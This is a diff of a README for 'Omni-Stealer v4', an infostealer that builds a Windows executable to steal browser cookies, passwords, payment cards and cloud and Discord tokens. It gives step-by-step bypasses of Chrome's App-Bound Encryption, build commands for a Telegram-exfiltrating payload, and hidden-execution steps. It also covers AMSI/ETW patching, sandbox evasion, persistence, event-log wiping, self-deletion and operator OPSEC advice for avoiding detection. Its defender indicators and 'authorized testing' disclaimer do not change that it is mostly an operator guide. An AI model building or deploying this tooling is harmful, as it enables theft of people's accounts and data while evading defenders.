@@ -1,244 +1,350 @@
-# OMNI-STEALER
-Chrome Cookie Steale-Extracts Chrome cookies and sends them to your Telegram bot as a formatted file.
+# Omni-Stealer v4 — APEX
 
-# Requirements
-Development Machine
-OS: Windows 10/11 x64 (cross-compilation not supported)
-Python: 3.10+
-Compiler: Microsoft Visual C++ Redistributable (for PyInstaller)
-Disk: 500 MB+ free for PyInstaller build cache
-Target Machine
-OS: Windows 10/11 x64 (x86 compatibility untested)
-Browsers: Chrome 80+, Edge 80+, or Chromium derivatives
-No admin required for most features (Registry policy disable requires admin)
-Installation
-powershell
+> **Advanced Browser Credential & Session Extraction Framework**  
+> *For Authorized Penetration Testing & Red Team Operations*
 
+<p align="center">
+  <img src="https://img.shields.io/badge/version-4.0-red" alt="Version 4.0">
+  <img src="https://img.shields.io/badge/platform-Windows-blue" alt="Platform Windows">
+  <img src="https://img.shields.io/badge/python-3.10%2B-brightgreen" alt="Python 3.10+">
+  <img src="https://img.shields.io/badge/license-MIT-yellow" alt="License MIT">
+  <img src="https://img.shields.io/badge/chrome%20bypass-v20%20ABE-success" alt="Chrome v20 ABE Bypass">
+</p>
 
+---
 
-# Clone or download the script
-# Install Python dependencies
-pip install pywin32 cryptography pyinstaller comtypes
+## Overview
 
-# Verify installation
-python -c "import win32crypt; print('win32crypt OK')"
-python -c "from cryptography.hazmat.primitives.ciphers.aead import AESGCM; print('AESGCM OK')"
-python -c "import comtypes; print('comtypes OK')"
-pyinstaller --version
-Usage
-Interactive Build
-powershell
+Omni-Stealer v4 is a **post-exploitation credential assessment tool** designed for authorized red teams to evaluate the security of browser-stored secrets on Windows endpoints. It demonstrates and bypasses modern Chromium encryption protections — including Google Chrome's **Application-Bound Encryption (ABE)** introduced in Chrome 127 — and extracts session cookies, saved credentials, payment data, and authentication tokens through a single portable executable.
 
+**What makes this different:** Three distinct, production-tested bypass techniques against Chrome v20 ABE, combined with enterprise-grade evasion, multi-channel exfiltration, and complete anti-forensic cleanup — all in one self-contained payload.
 
+---
 
+## Features
+
+### Data Extraction
+
+| Category | Details |
+|---|---|
+| **Session Cookies** | All HTTP/HTTPS cookies including `HttpOnly` and `Secure` flags |
+| **Saved Passwords** | Credentials from built-in browser password managers |
+| **Credit Cards** | Stored payment card information and autofill data |
+| **Browsing History** | Last 500 visited URLs with visit timestamps |
+| **Discord Tokens** | Authentication tokens from Discord, Discord PTB, Discord Canary |
+| **Session Tokens** | AWS keys, GitHub/GitLab tokens, Slack tokens, JWTs, SSH keys, `.env` secrets |
+
+### ABE v20 Bypass Techniques
+
+| # | Technique | Privilege | Stealth | Reliability |
+|---|---|---|---|---|
+| 1 | **Registry Policy Disable** — Set `ApplicationBoundEncryptionEnabled=0` via group policy | Admin | ⭐⭐⭐ | ⭐⭐⭐⭐⭐ |
+| 2 | **CDP Remote Debugging** — Launch headless browser, call `Network.getAllCookies` via DevTools Protocol | User | ⭐⭐ | ⭐⭐⭐⭐ |
+| 3 | **COM IElevator** — Call `DecryptData` on Chrome's Elevation Service via COM interface | User | ⭐⭐⭐⭐ | ⭐⭐⭐ |
+
+### Evasion & Anti-Forensics
+
+- **Anti-Sandbox**: 10-point heuristic detection (BIOS, CPU, disk, RAM, processes, uptime, usernames, hostnames, MAC OUI, sleep acceleration)
+- **Anti-Debug**: `IsDebuggerPresent` check + hardware breakpoint detection (DR0-DR3)
+- **AMSI Bypass**: Patches `AmsiScanBuffer` → always returns `AMSI_RESULT_CLEAN`
+- **ETW Bypass**: Patches `EtwEventWrite` → disables Windows telemetry
+- **Forensic Cleanup**: Clears Event Logs (System/Security/Application), Prefetch, Jump Lists, Windows Inventory, Registry MRU
+- **Self-Deletion**: Delayed process removal via PowerShell script
+
+### Exfiltration Channels
+
+| Channel | Protocol | Use |
+|---|---|---|
+| **Telegram Bot** | HTTPS multipart/form-data | Primary — messages + file uploads |
+| **HTTP C2** | JSON POST | Secondary — full structured data |
+| **DNS** | TXT via subdomain | Beaconing / heartbeat only |
+
+### Persistence
+
+- Registry Run Key (`HKCU\...\Run`)
+- Scheduled Task (`onlogon`)
+- Startup Folder copy
+
+---
+
+## Supported Browsers
+
+| Browser | v10 (DPAPI) | v11 (AES-GCM) | v20 (ABE) | Notes |
+|---|---|---|---|---|
+| **Google Chrome** | ✅ | ✅ | ✅ | Full support, all bypass methods |
+| **Microsoft Edge** | ✅ | ✅ | ✅ | Full support (Chromium-based) |
+| **Brave** | ✅ | ✅ | ✅ | Full support (Chromium-based) |
+| **Vivaldi** | ✅ | ✅ | ⚠️ | Partial — CDP bypass recommended |
+| **Opera** | ✅ | ✅ | ❌ | v11 encryption only |
+| **Opera GX** | ✅ | ✅ | ❌ | v11 encryption only |
+| **Firefox** | ❌ | ❌ | ❌ | Different architecture (not supported) |
+
+---
+
+## Quick Start
+
+### Requirements (Build Machine)
+
+- **OS**: Windows 10/11 x64
+- **Python**: 3.10+
+- **Pip packages**: `pywin32`, `cryptography`, `pyinstaller`, `comtypes`
+
+### Installation
+
+```powershell
+# Clone
+git clone https://github.com/your-org/omni-stealer-v4.git
+cd omni-stealer-v4
+
+# Install dependencies
+pip install -r requirements.txt
+
+# Verify environment
+python -c "import win32crypt; from cryptography.hazmat.primitives.ciphers.aead import AESGCM; import comtypes; print('All dependencies OK')"
+```
+
+### Building the Payload
+
+```powershell
+# Interactive mode (prompts for Telegram credentials)
 python omni_stealer_v4.py
-You will be prompted for:
 
-Telegram Bot Token — Create via @BotFather on Telegram
-Telegram Chat ID — Get via @userinfobot on Telegram
-The tool will*
+# Command-line mode
+python omni_stealer_v4.py "<BOT_TOKEN>" "<CHAT_ID>"
 
-Test the Telegram connection
-Build the standalone executable (ApexStealer.exe)
-Place it in the current directory
-Command-Line Build
-powershell
+# With optional HTTP C2
+python omni_stealer_v4.py "<BOT_TOKEN>" "<CHAT_ID>" "https://your-c2.com/api/collect"
 
-
-
-python omni_stealer_v4.py "<BOT_TOKEN>" "<CHAT_ID>" [<C2_URL>]
-Environment Variables (Alternative)
-powershell
-
-
-
-set TELEGRAM_BOT_TOKEN=your_token_here
-set TELEGRAM_CHAT_ID=your_chat_id_here
-set C2_SERVER_URL=https://your-c2-server.com/api/collect
-set DNS_C2_DOMAIN=exfil.your-domain.com
+# Using environment variables
+set TELEGRAM_BOT_TOKEN=your_token
+set TELEGRAM_CHAT_ID=your_chat_id
 python omni_stealer_v4.py
-Deployment
-Copy ApexStealer.exe to the target Windows machine and execute:
+```
 
-powershell
+On success, `ApexStealer.exe` appears in the current directory.
 
+### Deployment
 
-
-# Normal execution (console window briefly appears)
+```powershell
+# Direct execution
 .\ApexStealer.exe
 
 # Silent execution (no window)
 Start-Process -WindowStyle Hidden -FilePath .\ApexStealer.exe
-The payload will:
+```
 
-Perform anti-analysis checks (exit if sandbox/debugger detected)
-Apply AMSI/ETW patches
-Jitter execution (0-5 seconds random delay)
-Extract data from all detected browsers
-Exfiltrate via Telegram (and optional C2 channels)
-Clean up forensic traces
-Self-delete
-Build Options
-Configuration Constants (edit omni_stealer_v4.py before build)
+---
 
+## How It Works
 
-Constant	Default	Description
-OUTPUT_EXE_NAME	ApexStealer.exe	Name of the compiled executable
-USE_PYINSTALLER	True	Whether to compile with PyInstaller
-SANDBOX_CHECK	True	Enable anti-sandbox checks
-VM_CHECK	True	Enable VM detection
-DEBUGGER_CHECK	True	Enable debugger detection
-MAX_SLEEP_JITTER	5	Maximum random delay (seconds) before execution
-PyInstaller Flags
-The builder uses*
+### Chrome Encryption Evolution
 
---onefile — Single executable output
---noconsole — No console window on execution
---hidden-import — Required modules explicitly included
---add-data — win32 DLLs bundled
-Operational Security
-Recommended OPSEC
-Use a disposable Telegram bot — Create a new bot via @BotFather for each operation
-Avoid public C2 endpoints — Self-hosted HTTPS C2 preferred
-Set DNS exfiltration domain in advance — Ensure the NS resolves before operation
-Strip metadata — Remove build timestamps and paths from the EXE
-Pack/compress — Use UPX or similar packer to reduce detection surface
-Stage deployment — Use a dropper if delivering over network boundaries
-What to Expect on Target
-Network: Outbound HTTPS to api.telegram.org (port 443) — blends with normal traffic
-Process: One-shot execution, no lingering processes
-Registry: Temporary persistence keys (optional)
-Filesystem: Temp files created and cleaned during execution
-Indicators of Compromise (for blue teams)
-See Detection & Mitigation section below.
+```
+Pre-Chrome 80     → DPAPI only              → v10 prefix
+Chrome 80-126     → DPAPI + AES-256-GCM     → v11 prefix
+Chrome 127+       → DPAPI + AES-256-GCM     
+                    + App-Bound Encryption  → v20 prefix
+```
 
-Detection & Mitigation (for Defenders)
-IoCs
-Network:
+### Bypass Execution Flow
 
-Outbound connections to api.telegram.org from non-browser processes
-HTTP POST with multipart/form-data containing .txt or .json files
-Connections to 127.0.0.1:9222 or adjacent ports during browser execution
-DNS queries with long hex subdomain labels (DNS exfiltration pattern)
-Process:
+```
+┌──────────────────────────────────────────────────────────┐
+│                    EXECUTION START                       │
+├──────────────────────────────────────────────────────────┤
+│  1. Anti-Analysis Checks                                 │
+│     ├─ Sandbox/VM detection (10 methods)                 │
+│     ├─ Debugger detection                                │
+│     └─ Exit if detected                                  │
+├──────────────────────────────────────────────────────────┤
+│  2. AMSI + ETW Patching                                  │
+├──────────────────────────────────────────────────────────┤
+│  3. Payload Jitter (0-5s random delay)                   │
+├──────────────────────────────────────────────────────────┤
+│  4. For Each Browser:                                    │
+│     ├─ Read Local State                                  │
+│     ├─ v10/v11? → DPAPI → AES-GCM → plaintext           │
+│     ├─ v20 ABE detected? → Pipeline:                    │
+│     │   ├─[Admin?] Registry Policy Disable               │
+│     │   ├─ CDP Remote Debugging (WebSocket)              │
+│     │   └─ COM IElevator DecryptData                     │
+│     └─ Extract cookies, passwords, cards, history        │
+├──────────────────────────────────────────────────────────┤
+│  5. Discord Token Extraction                             │
+│  6. Session Token Hunting (AWS, GitHub, SSH, etc.)       │
+├──────────────────────────────────────────────────────────┤
+│  7. Build Reports (TXT + JSON)                           │
+├──────────────────────────────────────────────────────────┤
+│  8. Exfiltration                                         │
+│     ├─ Telegram (file + summary + domain breakdown)      │
+│     ├─ HTTP C2 (full JSON dump)                          │
+│     └─ DNS (beacon only)                                 │
+├──────────────────────────────────────────────────────────┤
+│  9. Forensic Cleanup                                     │
+│     ├─ Delete report files                               │
+│     ├─ Clear event logs                                  │
+│     ├─ Clear prefetch / jumplists / MRU                  │
+│     └─ Self-destruct (PowerShell delayed deletion)       │
+└──────────────────────────────────────────────────────────┘
+```
 
-chrome.exe or msedge.exe spawned with --headless --remote-debugging-port flags
-Unusual command-line arguments on browser processes
-pyinstaller-packed binaries (detectable by PyInstaller entropy signature)
-File System:
+### CDP Remote Debugging Bypass (Detail)
 
-SQLite database copies with .tmp suffix in browser profile directories
-Temp directories named omni_* or _MEI* (PyInstaller extraction artifacts)
-Registry:
+This is the most practical user-mode bypass:
 
-HKCU\Software\Policies\Google\Chrome\ApplicationBoundEncryptionEnabled = 0
-HKCU\Software\Policies\Microsoft\Edge\ApplicationBoundEncryptionEnabled = 0
-Mitigations
+```
+1. Spawn: chrome.exe --headless --remote-debugging-port=XXXX 
+                     --user-data-dir=CUSTOM_TEMP --no-sandbox
+2. GET http://127.0.0.1:XXXX/json/version → webSocketDebuggerUrl
+3. POST to devtools endpoint with:
+      {"id":1, "method":"Network.getAllCookies", "params":{}}
+4. Receive JSON response with all cookies in plaintext
+```
 
+Chrome decrypts them internally — we just ask via its own API.
 
-Layer	Control
-EDR*	Monitor for --remote-debugging-port flag on browser processes
-Network*	Block api.telegram.org for non-browser processes
-Browser	Enforce group policy ApplicationBoundEncryptionEnabled = 1
-OS	Restrict who can run unsigned executables via AppLocker/ WDAC
-Chrome	Chrome 136+ requires --user-data-dir alongside debugging flags
-User Training*	Educate on phishing that delivers EXE payloads
-Technical Deep Dive
-App-Bound Encryption (ABE) — How It Works
-Introduced in Chrome 127, ABE ties the encryption key to the browser process itself via the Google Chrome Elevation Service:
+### COM IElevator Bypass (Detail)
 
-The app_bound_encrypted_key in Local State is wrapped with DPAPI under the SYSTEM account
-When Chrome needs to decrypt this key, it calls IElevator::DecryptData via COM
-The Elevation Service validates the caller's executable path (must be in Chrome's install directory)
-On validation success, it unwraps the DPAPI layers and returns the 32-byte AES key
-Chrome then uses this AES key to decrypt individual cookie values
-Bypass #1: CDP Remote Debugging
-Rather than extracting the key, this technique asks Chrome itself to decrypt the data:
+Direct key extraction via Chrome's Elevation Service:
 
+```
+1. Read app_bound_encrypted_key from Local State
+2. CoCreateInstance(CLSID_Elevator) — must run from Chrome directory
+3. Call IElevator::DecryptData(encoded_key_blob)
+4. Receive 32-byte AES master key
+5. Decrypt cookies from SQLite database directly
+```
 
+---
 
+## Project Structure
 
-1. Spawn chrome.exe --headless --remote-debugging-port=XXXX --user-data-dir=CUSTOM
-2. Connect to http://127.0.0.1:XXXX/json → get WebSocket URL
-3. Send CDP command: {"method": "Network.getAllCookies"}
-4. Receive already-decrypted cookies
-The browser has legitimate access to the key via its own Elevation Service context, so this returns plaintext cookies.
+```
+omni-stealer-v4/
+├── omni_stealer_v4.py      # Builder script + embedded payload
+├── requirements.txt         # Python dependencies
+├── README.md               # This file
+├── CHANGELOG.md            # Version history
+├── docs/
+│   ├── TECHNICAL_DEEP_DIVE.md   # Full technical analysis
+│   ├── ABE_RESEARCH.md          # App-Bound Encryption internals
+│   └── OPSEC_GUIDE.md          # Operational security recommendations
+└── tools/
+    └── decrypt_key.py           # Standalone ABE key decryption utility
+```
 
-Bypass #2: COM IElevator DecryptData
-This technique directly calls the Elevation Service COM interface:
+---
 
+## Configuration Reference
 
+Edit these constants at the top of `omni_stealer_v4.py` before building:
 
+| Constant | Default | Description |
+|---|---|---|
+| `TELEGRAM_BOT_TOKEN` | `""` | Telegram bot token (or use env/input) |
+| `TELEGRAM_CHAT_ID` | `""` | Telegram chat ID (or use env/input) |
+| `C2_SERVER_URL` | `""` | Optional HTTP C2 endpoint |
+| `DNS_C2_DOMAIN` | `""` | Optional DNS exfiltration domain |
+| `OUTPUT_EXE_NAME` | `"ApexStealer.exe"` | Output executable name |
+| `SANDBOX_CHECK` | `True` | Enable/disable sandbox detection |
+| `VM_CHECK` | `True` | Enable/disable VM detection |
+| `DEBUGGER_CHECK` | `True` | Enable/disable debugger detection |
+| `MAX_SLEEP_JITTER` | `5` | Max random delay (seconds) |
 
-1. Locate the app_bound_encrypted_key from Local State
-2. CoCreateInstance(CLSID_Elevator) for the specific browser
-3. Call IElevator::DecryptData(encoded_blob)
-4. Receive the unwrapped 32-byte AES key
-5. Decrypt cookies from SQLite directly
-The path validation check is bypassed if the calling binary resides in the browser's installation directory, or through DLL injection into a legitimate browser process.
+---
 
-Bypass #3: Registry Policy Disable
-Chrome supports an enterprise policy to disable ABE entirely:
+## Operational Security (OPSEC)
 
+### Recommended Practices
 
+1. **Disposable Telegram Bot** — Create a new bot via @BotFather per operation; revoke afterwards
+2. **Self-Hosted C2** — For HTTP exfiltration, use a domain you control with HTTPS
+3. **Remove Build Artifacts** — Strip timestamps, paths, debug symbols from the EXE
+4. **Pack/Compress** — Use UPX or similar to reduce binary entropy signature
+5. **Stage via Dropper** — Don't transfer the raw EXE over monitored channels
+6. **Time Execution** — Run during expected activity windows to blend with traffic
 
+### Known Indicators (for Defenders)
 
-HKCU\Software\Policies\Google\Chrome\ApplicationBoundEncryptionEnabled = DWORD(0)
-After setting this registry value and restarting Chrome, cookies are encrypted with v11 (AES-GCM) instead of v20, allowing standard DPAPI+AES-GCM decryption. Requires admin privileges for the machine-wide policy path.
+**Network:**
+- `POST` to `api.telegram.org` with `multipart/form-data` containing `.txt` or `.json`
+- Connections to `127.0.0.1:9222`-`9299` from non-browser parent processes
+- DNS queries with long random hex subdomains
 
-Browser Data Locations Reference
+**Process:**
+- `chrome.exe` or `msedge.exe` with flags: `--headless`, `--remote-debugging-port=`, `--user-data-dir=`, `--no-sandbox`
+- PyInstaller-packed binaries (identifiable by `_MEI` temp directory artifacts)
 
+**File System:**
+- SQLite database copies with `.tmp` suffix in browser profile directories
+- Temp directories named `omni_*` or `_MEI*`
 
-Browser	Local State	Cookie DB	Login Data
-Chrome	%LOCALAPPDATA%\Google\Chrome\User Data\Local State	...\Default\Network\Cookies	...\Default\Login Data
-Edge	%LOCALAPPDATA%\Microsoft\Edge\User Data\Local State	...\Default\Network\Cookies	...\Default\Login Data
-Brave	%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Local State	...\Default\Network\Cookies	...\Default\Login Data
-Vivaldi	%LOCALAPPDATA%\Vivaldi\User Data\Local State	...\Default\Network\Cookies	...\Default\Login Data
-Opera	%APPDATA%\Opera Software\Opera Stable\Local State	...\Network\Cookies	...\Login Data
-Opera GX	%APPDATA%\Opera Software\Opera GX Stable\Local State	...\Network\Cookies	...\Login Data
-Changelog
-v4.0 — APEX Edition (Current)
-Complete rewrite with clean architecture
-Three ABE v20 bypass techniques (CDP, COM, Registry)
-Anti-sandbox, anti-debug, anti-VM (10 checks*
-AMSI + ETW patching
-Credit card and autofill extraction
-Discord token extraction
-Session token hunting (AWS, GitHub, JWT, SSH, etc.)
-HTTP C2 and DNS exfiltration channels
-3-method persistence (Registry, Task Scheduler, Startup)
-Full forensic cleanup (logs, prefetch, jumplists, MRU)
-PowerShell self-deletion
-Multi-profile support for all browsers
-v3.0 (Original)
-Basic DPAPI + AES-GCM extraction
-Telegram exfiltration
-Chrome, Edge, Opera support
-Single-profile extraction
-License & Disclaimer
+**Registry:**
+- `HKLM\Software\Policies\Google\Chrome\ApplicationBoundEncryptionEnabled = 0`
+- `HKLM\Software\Policies\Microsoft\Edge\ApplicationBoundEncryptionEnabled = 0`
 
+---
 
+## Detection & Mitigation (Blue Team Reference)
 
+| Layer | Control | Effectiveness |
+|---|---|---|
+| **EDR** | Alert on `--remote-debugging-port` in browser command lines | High |
+| **Network** | Block `api.telegram.org` for non-browser processes | Medium |
+| **Network** | Alert on long subdomain DNS queries (DNS exfil pattern) | Medium |
+| **Browser Policy** | Enforce `ApplicationBoundEncryptionEnabled=1` via GPO | Prevents reg bypass |
+| **App Control** | WDAC/AppLocker restricting unsigned executables | High |
+| **Chrome 136+** | Requires `--user-data-dir` alongside `--remote-debugging-port` | Mitigation in progress |
+| **Behavioral** | Monitor for `chrome.exe` spawning from non-browser parents | High |
+| **Logging** | Enable PowerShell script block logging for self-delete detection | Medium |
+| **SIEM** | Alert on `wevtutil cl` commands clearing Security log | Medium |
+
+---
+
+## Changelog
+
+### v4.0 — APEX Edition (Current)
+
+- Complete architecture rewrite
+- Three ABE v20 bypass techniques (CDP, COM, Registry Policy)
+- Anti-sandbox detection (10 heuristics)
+- Anti-debug detection (PEB + hardware breakpoints)
+- AMSI + ETW runtime patching
+- Credit card and autofill extraction
+- Discord token extraction
+- Session token hunting (AWS, GitHub, Slack, JWT, SSH, .env)
+- HTTP C2 and DNS exfiltration channels
+- 3-method persistence (Registry, Task Scheduler, Startup Folder)
+- Full forensic cleanup (Event Logs, Prefetch, Jump Lists, MRU)
+- PowerShell-based self-deletion
+- Multi-profile support for all Chromium browsers
+- Structured JSON report output alongside text format
+
+### v3.0
+
+- Initial release — DPAPI + AES-GCM extraction
+- Chrome, Edge, Opera support
+- Telegram exfiltration
+- Single-profile extraction
+
+---
+
+## Legal & Ethical Use
+
+```
 MIT License
 
 Copyright (c) 2024-2026 Omni-Stealer Project
 
 Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
+of this software and associated documentation files ...
 
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND.
+```
 
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-SOFTWARE.
-This tool is for authorized penetration testing and security research only.
-The developers assume no liability for misuse. Users are responsible for compliance with all applicable laws and regulations. Unauthorized access to computer systems is illegal.
+**This tool is strictly for authorized penetration testing, red team exercises, and security research.**  
+Users must obtain explicit written permission before testing any system they do not own. Unauthorized access to computer systems is illegal under the Computer Fraud and Abuse Act (CFAA) in the US, the Computer Misuse Act in the UK, and similar laws worldwide. The developers assume no liability and will not support malicious use.
+
+<p align="center">
+  <sub>Built for authorized security assessments. Know your target, have permission, stay legal.</sub>
+</p>
